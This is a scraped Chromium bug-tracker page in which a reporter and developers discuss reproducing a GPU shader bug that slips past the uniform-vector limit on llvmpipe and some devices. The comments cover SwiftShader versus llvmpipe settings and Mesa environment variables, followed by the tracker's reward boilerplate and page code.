        Hi,<span class="line"><!---->Hi,<!----></span><br>I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->I saw that clusterfuzz failed to reproduce the testcase. It seems that swift shader is used instead of llvmpipe due to the added option ``--use-gl=angle --use-angle=swiftshader``. The google swift shader is not affected and the compilation of the buggy shader is fails with ``Array size of (xxx) exceeds limit of gl_MaxFragmentUniformVectors(261)``. The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>An other common ground I could identify is:<span class="line"><!---->An other common ground I could identify is:<!----></span><br>Affected: GL_VERSION = OpenGL ES x.y.z<span class="line"><!---->Affected: GL_VERSION = OpenGL ES x.y.z<!----></span><br>Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<span class="line"><!---->Not Affected: GL_VERSION = OpenGL ES x.y.z SwiftShader a.b.c<!----></span><br><br>On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<span class="line"><!---->On a Pixel4 with Android 11 the shader also compiles indicating a missing check. However the bug triggers on the GPU leading to strange behavior (In some cases system UI freeze/crash) and no PC control.<!----></span><br><br>If this bug is not within the chrome project and can pinpoint the affected project please let me know.<span class="line"><!---->If this bug is not within the chrome project and can pinpoint the affected project please let me know.<!----></span><br><br>[1] <span class="line"><!---->[1] <!----></span>https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&alt=media<a class="undefined" target="_blank" href="https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media"><!---->https://www.googleapis.com/download/storage/v1/b/chromium-browser-msan/o/linux-release%2Fmsan-chained-origins-linux-release-834666.zip?generation=1607429425401070&amp;alt=media<!----></a><mr-comment-content></mr-comment-content>

        Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<span class="line"><!---->Any system with Mesa (i.e. pretty much all Linux systems) should have llvmpipe available as a fallback. A quick search shows that the way to do this nowadays is to set:<!----></span><br><br>LIBGL_ALWAYS_SOFTWARE=1<span class="line"><!---->LIBGL_ALWAYS_SOFTWARE=1<!----></span><br>GALLIUM_DRIVER=llvmpipe<span class="line"><!---->GALLIUM_DRIVER=llvmpipe<!----></span><br><br>https://docs.mesa3d.org/envvars.html<a class="undefined" target="_blank" href="https://docs.mesa3d.org/envvars.html"><!---->https://docs.mesa3d.org/envvars.html<!----></a><br>(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<span class="line"><!---->(I seem to remember it used to be a bit harder, had to set some LD variables, but that probably isn't necessary anymore.)<!----></span><br><br>In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<span class="line"><!---->In Chromium you might also need --ignore-gpu-blocklist if Chromium blocklists llvmpipe. I'm not sure whether we do - on a cursory inspection, I only see an entry for a very old version of Mesa, so we may not blocklist it.<!----></span><br>https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<a class="undefined" target="_blank" href="https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json"><!---->https://source.chromium.org/chromium/chromium/src/+/master:gpu/config/software_rendering_list.json<!----></a><mr-comment-content></mr-comment-content>

        > The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<span class="line"><!---->&gt; The msan build still uses Swift and not llvmpipe per default even with with ``--use-gl=angle --use-angle=llvmpipe``. chrome://gpu still says ``Google Swift Shader`` as ``GL_Renderer`` and not ``Angle (xxx)``.<!----></span><br><br>llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<span class="line"><!---->llvmpipe is not an ANGLE backend, so you can't do --use-angle=llvmpipe. llvmpipe is part of Mesa, which is system software.<!----></span><mr-comment-content></mr-comment-content>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products.     <mr-error hidden=""><!----><!----></mr-error>

        for LitElement.

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

        for LitElement.

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
